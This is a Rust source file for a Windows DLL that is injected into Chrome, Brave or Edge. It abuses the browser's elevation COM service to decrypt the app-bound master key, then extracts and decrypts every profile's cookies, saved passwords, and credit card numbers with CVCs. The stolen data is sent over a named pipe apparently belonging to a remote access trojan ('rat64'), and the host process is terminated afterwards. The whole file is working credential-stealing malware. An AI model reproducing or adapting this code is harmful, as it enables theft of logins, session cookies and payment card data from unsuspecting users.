#![cfg(target_os = "windows")]
// Minimal Windows DLL that runs Chrome/Brave/Edge app-bound decrypt inside host process.
// Writes JSON outputs to %LOCALAPPDATA%/chrome_decrypt_out/<Browser>/<Profile>/...
use std::{
    ffi::c_void,
    fs,
    path::{Path, PathBuf},
    ptr,
};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
use rusqlite::{Connection, OpenFlags};
use serde::Serialize;
use windows::{
    core::{IUnknown, Interface, BSTR, GUID, HRESULT},
    Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize, CLSCTX_LOCAL_SERVER,
        COINIT_APARTMENTTHREADED, EOLE_AUTHENTICATION_CAPABILITIES, RPC_C_AUTHN_LEVEL,
        RPC_C_IMP_LEVEL,
    },
};
#[link(name = "oleaut32")]
unsafe extern "system" {
    fn SysAllocStringByteLen(psz: *const u8, len: u32) -> BSTR;
    fn SysStringByteLen(bstr: BSTR) -> u32;
}
// Terminate the host process when finished (for suspended-launch -> inject use case)
#[link(name = "kernel32")]
unsafe extern "system" {
    fn GetCurrentProcess() -> *mut c_void;
    fn TerminateProcess(hProcess: *mut c_void, uExitCode: u32) -> i32;
    fn CreateFileW(
        lpFileName: *const u16,
        dwDesiredAccess: u32,
        dwShareMode: u32,
        lpSecurityAttributes: *mut c_void,
        dwCreationDisposition: u32,
        dwFlagsAndAttributes: u32,
        hTemplateFile: *mut c_void,
    ) -> *mut c_void;
    fn WriteFile(
        hFile: *mut c_void,
        lpBuffer: *const c_void,
        nNumberOfBytesToWrite: u32,
        lpNumberOfBytesWritten: *mut u32,
        lpOverlapped: *mut c_void,
    ) -> i32;
    fn CloseHandle(hObject: *mut c_void) -> i32;
    fn GetLastError() -> u32;
}
// Named pipe constants
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_SHARE_READ: u32 = 0x00000001;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
const KEY_SIZE: usize = 32;
const GCM_IV_LEN: usize = 12;
const GCM_TAG_LEN: usize = 16;
const COOKIE_PLAINTEXT_HEADER: usize = 32;
#[repr(C)]
#[allow(non_snake_case)] // Windows COM API仕様
struct IUnknownVtbl {
    pub QueryInterface: unsafe extern "system" fn(
        this: *mut c_void,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut c_void) -> u32,
}
#[repr(C)]
#[allow(non_snake_case)] // Windows COM API仕様
struct IElevatorVtbl {
    pub QueryInterface: unsafe extern "system" fn(
        this: *mut c_void,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> HRESULT,
    pub AddRef: unsafe extern "system" fn(this: *mut c_void) -> u32,
    pub Release: unsafe extern "system" fn(this: *mut c_void) -> u32,
    pub RunRecoveryCRXElevated: unsafe extern "system" fn(
        this: *mut c_void,
        a: *const u16,
        b: *const u16,
        c: *const u16,
        d: *const u16,
        e: u32,
        f: *mut usize,
    ) -> HRESULT,
    pub EncryptData: unsafe extern "system" fn(
        this: *mut c_void,
        level: i32,
        input: BSTR,
        output: *mut BSTR,
        perr: *mut u32,
    ) -> HRESULT,
    pub DecryptData: unsafe extern "system" fn(
        this: *mut c_void,
        input: BSTR,
        output: *mut BSTR,
        perr: *mut u32,
    ) -> HRESULT,
}
unsafe fn query_interface(unk: &IUnknown, iid: &GUID) -> anyhow::Result<*mut c_void> {
    let obj = unk.as_raw();
    let vtbl_ptr = unsafe { *(obj as *mut *mut IUnknownVtbl) };
    let mut out: *mut c_void = std::ptr::null_mut();
    let hr = unsafe { ((*vtbl_ptr).QueryInterface)(obj, iid as *const _, &mut out) };
    if hr.is_err() || out.is_null() {
        anyhow::bail!("QueryInterface failed: 0x{:08x}", hr.0);
    }
    Ok(out)
}
#[derive(Clone, Debug)]
struct BrowserConfig {
    name: &'static str,
    clsid: GUID,
    iid: GUID,
    user_data_subpath: &'static str,
}
fn local_app_data() -> PathBuf {
    dirs::data_local_dir().unwrap_or_else(|| PathBuf::from("."))
}
fn browser_config_for_host() -> anyhow::Result<BrowserConfig> {
    let exe = std::env::current_exe()?
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let (name, clsid, iid, subpath) = match exe.as_str() {
        "chrome.exe" => (
            "Chrome",
            GUID::from_values(
                0x708860e0,
                0xf641,
                0x4611,
                [0x88, 0x95, 0x7d, 0x86, 0x7d, 0xd3, 0x67, 0x5b],
            ),
            GUID::from_values(
                0x463abecf,
                0x410d,
                0x407f,
                [0x8a, 0xf5, 0x0d, 0xf3, 0x5a, 0x00, 0x5c, 0xc8],
            ),
            "Google/Chrome/User Data",
        ),
        "brave.exe" => (
            "Brave",
            GUID::from_values(
                0x576b31af,
                0x6369,
                0x4b6b,
                [0x85, 0x60, 0xe4, 0xb2, 0x03, 0xa9, 0x7a, 0x8b],
            ),
            GUID::from_values(
                0xf396861e,
                0x0c8e,
                0x4c71,
                [0x82, 0x56, 0x2f, 0xae, 0x6d, 0x75, 0x9c, 0xe9],
            ),
            "BraveSoftware/Brave-Browser/User Data",
        ),
        "msedge.exe" => (
            "Edge",
            GUID::from_values(
                0x1fcbe96c,
                0x1697,
                0x43af,
                [0x91, 0x40, 0x28, 0x97, 0xc7, 0xc6, 0x97, 0x67],
            ),
            GUID::from_values(
                0xc9c2b807,
                0x7731,
                0x4f34,
                [0x81, 0xb7, 0x44, 0xff, 0x77, 0x79, 0x52, 0x2b],
            ),
            "Microsoft/Edge/User Data",
        ),
        _ => anyhow::bail!("Unsupported host process: {}", exe),
    };
    Ok(BrowserConfig {
        name,
        clsid,
        iid,
        user_data_subpath: subpath,
    })
}
fn user_data_root(cfg: &BrowserConfig) -> PathBuf {
    local_app_data().join(cfg.user_data_subpath)
}
fn read_file_to_string(p: &Path) -> anyhow::Result<String> {
    Ok(fs::read_to_string(p)?)
}
fn read_app_bound_encrypted_key(local_state: &Path) -> anyhow::Result<Vec<u8>> {
    let content = read_file_to_string(local_state)?;
    let tag = "\"app_bound_encrypted_key\":\"";
    if let Some(start) = content.find(tag) {
        let s = start + tag.len();
        if let Some(end) = content[s..].find('"') {
            let b64 = &content[s..s + end];
            let decoded = BASE64.decode(b64)?;
            if decoded.len() < 4 || &decoded[..4] != b"APPB" {
                anyhow::bail!("APPB prefix missing");
            }
            return Ok(decoded[4..].to_vec());
        }
    }
    anyhow::bail!("app_bound_encrypted_key not found")
}
fn decrypt_master_key_com(cfg: &BrowserConfig, enc_key: &[u8]) -> anyhow::Result<[u8; KEY_SIZE]> {
    unsafe {
        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
    }
    struct CoGuard;
    impl Drop for CoGuard {
        fn drop(&mut self) {
            unsafe {
                CoUninitialize();
            }
        }
    }
    let _co = CoGuard;
    let bstr_in = unsafe { SysAllocStringByteLen(enc_key.as_ptr(), enc_key.len() as u32) };
    if bstr_in.is_empty() {
        anyhow::bail!("SysAllocStringByteLen failed");
    }
    let mut bstr_out: BSTR = BSTR::new();
    let mut com_err: u32 = 0;
    unsafe {
        let unk: IUnknown = CoCreateInstance(&cfg.clsid, None, CLSCTX_LOCAL_SERVER).unwrap();
        let iface_ptr = query_interface(&unk, &cfg.iid)?;
        let iface_unknown: IUnknown = IUnknown::from_raw(iface_ptr as _);
        let _ = CoSetProxyBlanket(
            &iface_unknown,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            None,
            RPC_C_AUTHN_LEVEL(RPC_C_AUTHN_LEVEL_PKT_PRIVACY),
            RPC_C_IMP_LEVEL(RPC_C_IMP_LEVEL_IMPERSONATE),
            None,
            EOLE_AUTHENTICATION_CAPABILITIES(EOAC_DYNAMIC_CLOAKING as i32),
        );
        let vtbl = *(iface_unknown.as_raw() as *mut *mut IElevatorVtbl);
        let hr = ((*vtbl).DecryptData)(
            iface_unknown.as_raw(),
            bstr_in.clone(),
            &mut bstr_out,
            &mut com_err,
        );
        drop(iface_unknown);
        if hr.is_err() {
            anyhow::bail!("IElevator->DecryptData failed: 0x{:08x}", hr.0);
        }
    }
    let byte_len = unsafe { SysStringByteLen(bstr_out.clone()) } as usize;
    if byte_len != KEY_SIZE {
        anyhow::bail!("Unexpected key size: {}", byte_len);
    }
    let mut key = [0u8; KEY_SIZE];
    unsafe {
        std::ptr::copy_nonoverlapping(bstr_out.as_ptr() as *const u8, key.as_mut_ptr(), KEY_SIZE);
    }
    Ok(key)
}
fn decrypt_chrome_gcm(master_key: &[u8], blob: &[u8]) -> Option<Vec<u8>> {
    if blob.len() < 3 + GCM_IV_LEN + GCM_TAG_LEN {
        return None;
    }
    let prefix = &blob[..3];
    if prefix != b"v10" && prefix != b"v20" {
        return None;
    }
    let iv = &blob[3..3 + GCM_IV_LEN];
    let tag = &blob[blob.len() - GCM_TAG_LEN..];
    let ct = &blob[3 + GCM_IV_LEN..blob.len() - GCM_TAG_LEN];
    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let cipher = Aes256Gcm::new(key);
    let mut combined = Vec::with_capacity(ct.len() + tag.len());
    combined.extend_from_slice(ct);
    combined.extend_from_slice(tag);
    cipher
        .decrypt(Nonce::from_slice(iv), combined.as_ref())
        .ok()
}
#[derive(Serialize)]
struct CookieOut {
    host: String,
    name: String,
    path: String,
    value: String,
    expires: i64,
    secure: bool,
    #[serde(rename = "httpOnly")]
    http_only: bool,
}
#[derive(Serialize)]
struct PasswordOut {
    origin: String,
    username: String,
    password: String,
}
#[derive(Serialize)]
struct PaymentOut {
    name_on_card: String,
    expiration_month: i64,
    expiration_year: i64,
    card_number: String,
    cvc: String,
}
// 統合データ構造（DLL内部用）
#[derive(Serialize)]
struct ChromeDecryptData {
    browser_name: String,
    profile_name: String,
    cookies: Vec<CookieOut>,
    passwords: Vec<PasswordOut>,
    payments: Vec<PaymentOut>,
}
// 全プロファイルの統合データ
#[derive(Serialize)]
struct ChromeDecryptResult {
    browser_type: String,
    profiles: Vec<ChromeDecryptData>,
    total_cookies: usize,
    total_passwords: usize,
    total_payments: usize,
}
fn open_sqlite_readonly(path: &Path) -> anyhow::Result<Connection> {
    let mut uri = format!("file:{}?nolock=1", path.display());
    uri = uri.replace('\\', "/");
    Ok(Connection::open_with_flags(
        uri,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_URI,
    )?)
}
fn extract_cookies(conn: &Connection, key: &[u8]) -> anyhow::Result<Vec<CookieOut>> {
    let mut stmt = conn.prepare("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, value FROM cookies;")?;
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let path: String = row.get(2)?;
        let is_secure: i64 = row.get(3)?;
        let is_httponly: i64 = row.get(4)?;
        let expires: i64 = row.get(5)?;
        let blob: Vec<u8> = row.get(6)?;
        let plain_val: String = row.get(7)?;
        Ok((
            host,
            name,
            path,
            is_secure != 0,
            is_httponly != 0,
            expires,
            blob,
            plain_val,
        ))
    })?;
    let mut out = Vec::new();
    for row in rows {
        let (host, name, path, is_secure, is_httponly, expires, blob, plain_val) = row?;
        let mut value_opt: Option<String> = None;
        if !blob.is_empty() {
            if let Some(plain) = decrypt_chrome_gcm(key, &blob) {
                if plain.len() > COOKIE_PLAINTEXT_HEADER {
                    value_opt = Some(
                        String::from_utf8_lossy(&plain[COOKIE_PLAINTEXT_HEADER..]).to_string(),
                    );
                }
            }
        }
        if value_opt.is_none() && !plain_val.is_empty() {
            value_opt = Some(plain_val);
        }
        if let Some(value) = value_opt {
            out.push(CookieOut {
                host,
                name,
                path,
                value,
                expires,
                secure: is_secure,
                http_only: is_httponly,
            });
        }
    }
    Ok(out)
}
fn extract_passwords(conn: &Connection, key: &[u8]) -> anyhow::Result<Vec<PasswordOut>> {
    let mut stmt =
        conn.prepare("SELECT origin_url, username_value, password_value FROM logins;")?;
    let rows = stmt.query_map([], |row| {
        let origin: String = row.get(0)?;
        let username: String = row.get(1)?;
        let blob: Vec<u8> = row.get(2)?;
        Ok((origin, username, blob))
    })?;
    let mut out = Vec::new();
    for row in rows {
        let (origin, username, blob) = row?;
        if let Some(plain) = decrypt_chrome_gcm(key, &blob) {
            out.push(PasswordOut {
                origin,
                username,
                password: String::from_utf8_lossy(&plain).to_string(),
            });
        }
    }
    Ok(out)
}
fn read_cvc_map(conn: &Connection) -> rusqlite::Result<std::collections::HashMap<String, Vec<u8>>> {
    let mut map = std::collections::HashMap::new();
    if let Ok(mut stmt) = conn.prepare("SELECT guid, value_encrypted FROM local_stored_cvc;") {
        let rows = stmt.query_map([], |row| {
            let guid: String = row.get(0)?;
            let blob: Vec<u8> = row.get(1)?;
            Ok((guid, blob))
        })?;
        for row in rows {
            let (g, b) = row?;
            map.insert(g, b);
        }
    }
    Ok(map)
}
fn extract_payments(conn: &Connection, key: &[u8]) -> anyhow::Result<Vec<PaymentOut>> {
    let cvc_map = read_cvc_map(conn).unwrap_or_default();
    let mut stmt = conn.prepare("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;")?;
    let rows = stmt.query_map([], |row| {
        let guid: String = row.get(0)?;
        let name_on_card: String = row.get(1)?;
        let exp_month: i64 = row.get(2)?;
        let exp_year: i64 = row.get(3)?;
        let blob: Vec<u8> = row.get(4)?;
        Ok((guid, name_on_card, exp_month, exp_year, blob))
    })?;
    let mut out = Vec::new();
    for row in rows {
        let (guid, name_on_card, exp_month, exp_year, blob) = row?;
        let mut card_number = String::new();
        if let Some(plain) = decrypt_chrome_gcm(key, &blob) {
            card_number = String::from_utf8_lossy(&plain).to_string();
        }
        let mut cvc = String::new();
        if let Some(cvc_blob) = cvc_map.get(&guid) {
            if let Some(plain) = decrypt_chrome_gcm(key, cvc_blob) {
                cvc = String::from_utf8_lossy(&plain).to_string();
            }
        }
        out.push(PaymentOut {
            name_on_card,
            expiration_month: exp_month,
            expiration_year: exp_year,
            card_number,
            cvc,
        });
    }
    Ok(out)
}
fn find_profiles(root: &Path) -> Vec<PathBuf> {
    let required = [
        Path::new("Network").join("Cookies"),
        PathBuf::from("Login Data"),
        PathBuf::from("Web Data"),
    ];
    let mut profiles = std::collections::BTreeSet::new();
    let is_profile = |p: &Path| required.iter().any(|r| p.join(r).exists());
    if is_profile(root) {
        profiles.insert(root.to_path_buf());
    }
    if let Ok(rd) = fs::read_dir(root) {
        for e in rd.flatten() {
            if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                let p = e.path();
                if is_profile(&p) {
                    profiles.insert(p);
                }
            }
        }
    }
    profiles.into_iter().collect()
}
// ファイル書き込み関数は削除（IPC通信使用のため）
// IPC通信でデータを送信（リトライ機能付き）
fn send_data_via_ipc(data: &ChromeDecryptResult) -> anyhow::Result<()> {
    // Debug log
    let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
    let _ = std::fs::OpenOptions::new()
        .append(true)
        .open(&log_path)
        .and_then(|mut f| {
            std::io::Write::write_all(
                &mut f,
                format!("IPC: Starting data serialization\n").as_bytes(),
            )
        });
    // JSONでシリアライズ
    let serialized = serde_json::to_vec(data)?;
    let _ = std::fs::OpenOptions::new()
        .append(true)
        .open(&log_path)
        .and_then(|mut f| {
            std::io::Write::write_all(
                &mut f,
                format!("IPC: Serialized {} bytes\n", serialized.len()).as_bytes(),
            )
        });
    // 名前付きパイプに接続してデータを送信
    let pipe_name = r"\\.\pipe\rat64_chrome_data";
    let mut pipe_name_wide: Vec<u16> = pipe_name.encode_utf16().collect();
    pipe_name_wide.push(0); // null terminate
    // 最大5回リトライ
    for attempt in 1..=5 {
        let _ = std::fs::OpenOptions::new()
            .append(true)
            .open(&log_path)
            .and_then(|mut f| {
                std::io::Write::write_all(
                    &mut f,
                    format!("IPC: Attempt {} - trying to connect to pipe\n", attempt).as_bytes(),
                )
            });
        unsafe {
            let handle = CreateFileW(
                pipe_name_wide.as_ptr(),
                GENERIC_WRITE,
                FILE_SHARE_READ,
                ptr::null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            );
            if handle == INVALID_HANDLE_VALUE {
                let error = GetLastError();
                let _ = std::fs::OpenOptions::new()
                    .append(true)
                    .open(&log_path)
                    .and_then(|mut f| {
                        std::io::Write::write_all(
                            &mut f,
                            format!("IPC: Attempt {} failed with error {}\n", attempt, error)
                                .as_bytes(),
                        )
                    });
                if attempt < 5 {
                    // パイプサーバーの準備を待機
                    std::thread::sleep(std::time::Duration::from_millis(200 * attempt));
                    continue;
                } else {
                    anyhow::bail!(
                        "Failed to open named pipe after {} attempts: error {}",
                        attempt,
                        error
                    );
                }
            }
            let mut bytes_written: u32 = 0;
            let success = WriteFile(
                handle,
                serialized.as_ptr() as *const c_void,
                serialized.len() as u32,
                &mut bytes_written,
                ptr::null_mut(),
            );
            CloseHandle(handle);
            if success == 0 {
                let error = GetLastError();
                anyhow::bail!("Failed to write to named pipe: error {}", error);
            }
            if bytes_written != serialized.len() as u32 {
                anyhow::bail!(
                    "Incomplete write to named pipe: {}/{}",
                    bytes_written,
                    serialized.len()
                );
            }
            // 成功
            let _ = std::fs::OpenOptions::new()
                .append(true)
                .open(&log_path)
                .and_then(|mut f| {
                    std::io::Write::write_all(
                        &mut f,
                        format!("IPC: Successfully sent {} bytes to pipe\n", bytes_written)
                            .as_bytes(),
                    )
                });
            return Ok(());
        }
    }
    anyhow::bail!("All IPC connection attempts failed");
}
fn dll_worker() -> anyhow::Result<()> {
    // Debug log to file
    let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
    let _ = std::fs::write(
        &log_path,
        format!(
            "DLL Worker started at {}: {:#?}\n",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            std::env::current_exe()
        ),
    );
    let cfg = match browser_config_for_host() {
        Ok(cfg) => {
            let _ = std::fs::write(&log_path, format!("Browser config: {:#?}\n", cfg));
            cfg
        }
        Err(e) => {
            let _ = std::fs::write(&log_path, format!("Browser config error: {}\n", e));
            return Err(e);
        }
    };
    let root = user_data_root(&cfg);
    let local_state = root.join("Local State");
    let _ = std::fs::write(
        &log_path,
        format!("Root path: {:#?}\nLocal State: {:#?}\n", root, local_state),
    );
    // COM decrypt should succeed inside host process
    let appb = match read_app_bound_encrypted_key(&local_state) {
        Ok(appb) => {
            let _ = std::fs::write(&log_path, format!("App bound key length: {}\n", appb.len()));
            appb
        }
        Err(e) => {
            let _ = std::fs::write(&log_path, format!("App bound key error: {}\n", e));
            return Err(e);
        }
    };
    let master_key = match decrypt_master_key_com(&cfg, &appb) {
        Ok(key) => {
            let _ = std::fs::write(&log_path, "Master key decrypted successfully\n".to_string());
            key
        }
        Err(e) => {
            let _ = std::fs::write(&log_path, format!("Master key decrypt error: {}\n", e));
            return Err(e);
        }
    };
    // データを統合してIPC通信で送信
    let profiles = find_profiles(&root);
    let _ = std::fs::write(&log_path, format!("Found {} profiles\n", profiles.len()));
    let mut all_profile_data = Vec::new();
    let mut total_cookies = 0;
    let mut total_passwords = 0;
    let mut total_payments = 0;
    for (i, profile) in profiles.iter().enumerate() {
        let _ = std::fs::write(
            &log_path,
            format!("Processing profile {}: {:#?}\n", i, profile),
        );
        let profile_name = profile
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Unknown")
            .to_string();
        let mut cookies = Vec::new();
        let mut passwords = Vec::new();
        let mut payments = Vec::new();
        // Cookies
        let cookies_db = profile.join("Network").join("Cookies");
        if cookies_db.exists() {
            if let Ok(conn) = open_sqlite_readonly(&cookies_db) {
                if let Ok(extracted_cookies) = extract_cookies(&conn, &master_key) {
                    let _ = std::fs::write(
                        &log_path,
                        format!("Extracted {} cookies\n", extracted_cookies.len()),
                    );
                    cookies = extracted_cookies;
                }
            }
        }
        // Passwords
        let login_db = profile.join("Login Data");
        if login_db.exists() {
            if let Ok(conn) = open_sqlite_readonly(&login_db) {
                if let Ok(extracted_passwords) = extract_passwords(&conn, &master_key) {
                    let _ = std::fs::write(
                        &log_path,
                        format!("Extracted {} passwords\n", extracted_passwords.len()),
                    );
                    passwords = extracted_passwords;
                }
            }
        }
        // Payments
        let web_db = profile.join("Web Data");
        if web_db.exists() {
            if let Ok(conn) = open_sqlite_readonly(&web_db) {
                if let Ok(extracted_payments) = extract_payments(&conn, &master_key) {
                    let _ = std::fs::write(
                        &log_path,
                        format!("Extracted {} payments\n", extracted_payments.len()),
                    );
                    payments = extracted_payments;
                }
            }
        }
        total_cookies += cookies.len();
        total_passwords += passwords.len();
        total_payments += payments.len();
        all_profile_data.push(ChromeDecryptData {
            browser_name: cfg.name.to_string(),
            profile_name,
            cookies,
            passwords,
            payments,
        });
    }
    // 統合データ構造を作成
    let result = ChromeDecryptResult {
        browser_type: cfg.name.to_string(),
        profiles: all_profile_data,
        total_cookies,
        total_passwords,
        total_payments,
    };
    // IPC通信でメインプロセスにデータを送信
    let _ = std::fs::write(
        &log_path,
        format!(
            "Attempting IPC send with {} profiles\n",
            result.profiles.len()
        ),
    );
    match send_data_via_ipc(&result) {
        Ok(()) => {
            let _ = std::fs::write(&log_path, format!("Successfully sent data via IPC\n"));
            let _ = std::fs::write(
                &log_path,
                format!(
                    "Total: {} cookies, {} passwords, {} payments\n",
                    total_cookies, total_passwords, total_payments
                ),
            );
            // IPC送信完了を確認するため少し待機
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Err(e) => {
            let _ = std::fs::write(&log_path, format!("Failed to send data via IPC: {}\n", e));
            // IPC送信に失敗してもプロセスは終了させる
        }
    }
    let _ = std::fs::write(&log_path, "DLL Worker function completed successfully\n");
    // Kill the host process once extraction completes (as requested for suspended-launch flow)
    unsafe {
        let _ = TerminateProcess(GetCurrentProcess(), 0);
    }
    Ok(())
}
// --- DllMain ---------------------------------------------------------------
#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllMain(
    _hinst: *mut c_void,
    reason: u32,
    _reserved: *mut c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if reason == DLL_PROCESS_ATTACH {
        // Spawn a new thread to avoid loader lock work in DllMain
        std::thread::spawn(move || {
            let log_path = std::env::temp_dir().join("chrome_decrypt_debug.log");
            let _ = std::fs::write(
                &log_path,
                format!(
                    "DllMain: Worker thread spawned at {}\n",
                    std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs()
                ),
            );
            // 実際の復号化処理を実行
            let result = dll_worker();
            let _ = std::fs::OpenOptions::new()
                .append(true)
                .open(&log_path)
                .and_then(|mut f| {
                    std::io::Write::write_all(
                        &mut f,
                        format!("DllMain: Worker result: {:#?}\n", result).as_bytes(),
                    )
                });
        });
    }
    1
}
// デッドコード削除：library_build_marker関数は不要